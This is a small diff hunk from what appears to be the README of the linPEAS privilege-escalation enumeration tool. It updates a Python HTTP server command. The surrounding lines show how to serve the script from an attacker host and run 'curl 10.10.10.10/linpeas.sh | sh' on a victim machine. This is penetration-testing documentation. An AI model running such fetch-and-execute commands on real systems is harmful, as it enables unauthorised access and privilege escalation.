@@ -22,7 +22,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 ```bash
 # Local network
-sudo python -m SimpleHTTPServer 80 #Host
+sudo python -m http.server 80 #Host
 curl 10.10.10.10/linpeas.sh | sh #Victim
 
 # Without curl
